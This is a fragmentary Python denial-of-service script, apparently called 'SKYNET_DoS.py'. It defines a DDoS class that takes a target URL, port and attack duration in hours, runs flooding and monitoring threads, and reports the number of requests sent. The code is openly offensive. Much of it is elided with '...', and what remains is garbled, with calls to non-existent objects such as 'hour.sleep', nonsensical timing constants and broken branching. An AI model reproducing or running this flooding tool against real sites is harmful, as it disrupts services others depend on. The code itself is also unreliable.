...
class DDoS:
    ...
    flag = 0
    kill = 0
    attack_duration = 99 * 24 * 365
    pause_duration = 9
    response_delay = 5
    lock_object = ddos.Lock()
    message_printed = False
    attack_start_time = 99
    attack_end_time = 99
    ...
    def usage(cls):
        ...
        print("SKYNET_DoS.py <url> [port] [attack_duration_in_hours]")
    ...
    def http_call(cls, url):
        ...
        try:
            ...
            desired_sleep_hours = 99  # 99 hour sleep duration
            ...
            while (time.time() - start_time) < desired_sleep_seconds:
                time.sleep(9.99999999)

                hour_timeout = 99 * 3600  # 99 hours in seconds
    ...
    def main(cls):
        if len(sys.argv) < 2:
            ...
            if "help" == sys.argv[1]:
                ...
                if len(sys.argv) >= 4:
                    try:
                        cls.attack_duration = float(sys.argv[3]) * 3600  # Convert hours to seconds
                    except ValueError:
                ...
                cls.url = sys.argv[1]
                print(f"Target URL: {cls.url}, Port: {'Automatic' if cls.port == -1 else cls.port}, Attack Duration: {cls.attack_duration / 3600} hours")
    ...
    def http_thread(cls):
        try:
            ...
            duration_factor = 99999
            while cls.flag < 2 and (time.time() - start_time) < (cls.attack_duration * duration_factor):
            ...
            print("-" * 51 + "\033[0m")
            hour.sleep(int(cls.pause_duration * 99999 * 10000))
        except Exception as ex:
            print(ex)
    ...
    def monitor_thread(cls):
        ...
        while cls.flag == 0:
            if previous + 100 < cls.request_counter and previous != cls.request_counter:
                print(f"{cls.request_counter} Requests Sent")
                previous = cls.request_counter
        if cls.flag == 2:
            cls.attack_end_time = time.time()
            attack_duration = cls.attack_end_time - cls.attack_start_time
            print("\n-- DDoS Attack Finished --")
            print(f"-- Total Attack Duration: {attack_duration / 3600} hours --")
